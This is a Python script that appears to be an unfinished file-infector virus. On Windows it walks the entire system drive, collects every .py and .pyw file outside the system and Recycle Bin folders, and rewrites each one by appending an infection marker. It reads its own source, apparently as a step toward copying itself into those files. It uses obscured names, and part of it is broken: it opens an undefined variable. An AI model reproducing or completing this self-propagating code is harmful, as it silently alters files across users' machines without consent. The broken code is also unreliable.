import glob
import sys
from sys import platform
import os, stat
import random
from itertools import islice
import time
import re
from os.path import expanduser

start_time = time.time()
xpressDict = {}
whoCares = []
trash = 'abcdefghijklmnopqrstuvwxyz'
lengh = random.randrange(10, 20)
_CURPYDIR = os.path.basename(os.path.normpath((sys.exec_prefix)))
_SYSENC = sys.getdefaultencoding()

if platform == "linux" or platform == "linux2":
    _OSV = "LINUKS"
    _OSDIR = expanduser("~")
    xpressDict = {_OSDIR}
    jetojedno = True  # todo
elif platform == "darwin":
    _OSV = "JABKO"
    _OSDIR = expanduser("~")
    xpressDict = {_OSDIR}
    jetojedno = True  # todo
elif platform == "win32":
    _OSV = "WOKNO"
    _WINPATH = os.environ['WINDIR']
    _WINDIR = "Windows"
    _OSDIR = os.environ['SYSTEMDRIVE'] + '\\'
    _RBIN = "$Recycle.Bin"
    xpressDict = {_WINDIR, _RBIN, _CURPYDIR}
    jetojedno = False

if not jetojedno:
    for i, value in enumerate(xpressDict):
        whoCares.append(value)
    fajly = {}
    adin = 0
    subdirnameP = ""
    pyborNR = 0
    eman = 0
    val = ""
    for subdir, dirs, files in os.walk(_OSDIR):
        if whoCares:
            for val in whoCares:
                if val in dirs:
                    dirs.remove(val)
        val = ""
        for file in files:
            if adin == 0:
                pyfiles = glob.glob(subdir + '\\*.py') + glob.glob(subdir + '\\*.pyw')
                adin = adin + 1
                for pyfile in pyfiles:
                    pyborNR = pyborNR + 1
                    hostS = open(fck, 'r', errors='ignore')
                    hdrrr = []
                    encdngTx = ""
                    for row in islice(hostS, 1):
                        for encdng in re.finditer('^[ \t\v]*#.*?coding[:=][ \t]*([-_.a-zA-Z0-9]+)', row, re.S):
                            encdngTx = encdng.group(1)
                            if encdngTx.endswith("unix") and _OSV == "WOKNO":
                                encdngTx = "Latin-1"  # TODO
                    if not encdngTx:
                        encdngTx = _SYSENC
                    hostS.close()
                    try:
                        f = open(pyfile, 'r', encoding=encdngTx, errors='ignore')
                    except:
                        encdngTx = "utf-8"
                        continue
                    hostS = open(pyfile, 'r', encoding=encdngTx, errors='ignore')
                    hostcodeS = hostS.read()
                    if not os.stat(pyfile).st_size == 0:
                        if hostcodeS.find("---*dffff*---") == -1:
                            myself = open(__file__, 'r')
                            mybody = hostcodeS + chr(10) + "#byltu ---*dffff*---"
                            try:
                                with open(pyfile, 'w', encoding=encdngTx, errors='ignore') as fin:
                                    fin.write(mybody)
                                    fin.close()
                            except IOError:
                                print('io err')
                            except:
                                print('any other err')
                                continue
                else:
                    adin = 0
                    break

    print(fajly)
    print("--- %s seconds ---" % (time.time() - start_time))
